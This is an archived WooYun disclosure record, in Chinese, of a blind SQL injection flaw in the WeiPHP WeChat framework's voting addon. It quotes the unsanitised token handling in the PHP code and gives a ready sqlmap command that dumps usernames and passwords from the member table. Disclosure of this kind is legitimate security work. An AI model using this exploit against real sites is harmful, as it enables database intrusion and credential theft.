{"id": 33385, "wybug_id": "wooyun-2015-0108933", "wybug_title": "WeiPHP微信开发框架SQL盲注", "wybug_corp": "weiphp", "wybug_author": "不能忍", "wybug_date": "2015-04-22 15:44", "wybug_open_date": "2015-06-06 15:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-06-06：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： WeiPHP微信开发框架SQL盲注 详细说明：  程序简介:weiphp是一个开源，高效，简洁的微信开发平台，它是基于oneThink这个简单而强大的内容管理框架实现的。旨在帮助开发者快速实现微信公众账号的个性化功能。开源产品WeiPHP下载量10万多，被众多开发者安装使用。   漏洞证明：  漏洞文件: addons/Vote/Controller/VoteController.class.php\tfunction join() {\t\t$token = get_token ();\t\t$opts_ids = array_filter ( I ( 'post.optArr' ) ); \t\t$vote_id = intval ( $_POST [\"vote_id\"] );\t\t// 检查ID是否合法\t\tif (empty ( $vote_id ) || 0 == $vote_id) {\t\t\t$this->error ( \"错误的投票ID\" );\t\t}\t\tif ($this->_is_overtime ( $vote_id )) {\t\t\t$this->error ( \"请在指定的时间内投票\" );\t\t}\t\tif ($this->_is_join ( $vote_id, $this->mid, $token )) {\t\t\t$this->error ( \"您已经投过,请不要重复投\" );\t\t}\t\tif (empty ( $_POST ['optArr'] )) {\t\t\t$this->error ( \"请先选择投票项\" );\t\t}           ...利用get_token函数来获取token：function get_token($token = NULL) {\tif ($token !== NULL) {\t\tsession ( 'token', $token );\t} elseif (! empty ( $_REQUEST ['token'] )) {\t\tsession ( 'token', $_REQUEST ['token'] );\t}\t$token = session ( 'token' ); \tif (empty ( $token )) {\t\treturn - 1;\t} \treturn $token;}获取之后直接返回，这个投票会检测是否投过票，投过就不能再投了！\tprivate function _is_join($vote_id, $user_id, $token) {\t\t// $vote_limit = M ( 'vote' )->where ( 'id=' . $vote_id )->getField ( 'vote_limit' );\t\t$vote_limit = 1;\t\t$list = M ( \"vote_log\" )->where ( \"vote_id=$vote_id AND user_id='$user_id' AND token='$token' AND options <>''\" )->select ();\t\t$count = count ( $list );\t\t$info = array_pop ( $list );\t\tif ($info) {\t\t\t$joinData = explode ( ',', $info ['options'] );\t\t\t$this->assign ( 'joinData', $joinData );\t\t}\t\tif ($count >= $vote_limit) {\t\t\treturn true;\t\t}\t\treturn false;\t}}这个检测把token带入执行导致sql注入。但是由于不会显，所以用盲注。利用方法：先注册一个用户，然后登录，之后添加一个投票。\n\n然后用sqlmap可以进行sql注入了：./sqlmap.py -u \"http://localhost/index.php?s=/addon/Vote/Vote/join.html\" --data=\"optArr%5B%5D=65&token=123*&wecha_id=&vote_id=34\" --cookie=\"PHPSESSID=7dkdoophklk01k0r749491f2l5; thinkphp_show_page_trace=0|0\" --threads 10 --batch -D weiphp -T wp_ucenter_member -C username,password --dump -v 4--cookie这里给的是你登录之后的cookie。vote_id为你的投票id\n\n   修复方案：  过滤   版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}